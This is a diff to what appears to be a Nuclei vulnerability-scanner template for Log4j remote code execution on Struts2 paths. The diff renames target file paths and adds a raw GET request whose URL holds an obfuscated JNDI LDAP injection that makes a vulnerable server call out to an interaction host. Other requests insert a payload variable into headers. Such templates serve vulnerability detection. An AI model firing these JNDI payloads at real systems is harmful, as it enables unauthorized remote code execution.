@@ -4,27 +4,32 @@ info:
   name: log4j-rce-structs2
   author: dr34d
   severity: critical
-  tags: apache,rce
+  tags: apache structs2,rce
 
 requests:
   - raw:
       - |
-        GET /static/c380bded4bbe1fda2cda6096c56577ad.js HTTP/1.1
+        GET /static/utils.js HTTP/1.1
         Host: {{Hostname}}
         {{log4j_payloads}}
 
       - |
-        GET /struts/c380bded4bbe1fda2cda6096c56577ad.js HTTP/1.1
+        GET /struts/utils.js HTTP/1.1
+        Host: {{Hostname}}
+        {{log4j_payloads}}
+
+        
+      - |
+        GET /$%7Bjndi:ldap:$%7B::-/%7D/{{interactsh-url}}/abc%7D/ HTTP/1.1
+        Host: {{Hostname}}
+
+      - |
+        POST /static/utils.js HTTP/1.1
         Host: {{Hostname}}
         {{log4j_payloads}}
 
       - |
-        POST /static/c380bded4bbe1fda2cda6096c56577ad.js HTTP/1.1
-        Host: {{Hostname}}
-        {{log4j_payloads}}
-
-      - |
-        POST /struts/c380bded4bbe1fda2cda6096c56577ad.js HTTP/1.1
+        POST /struts/utils.js HTTP/1.1
         Host: {{Hostname}}
         {{log4j_payloads}}
 
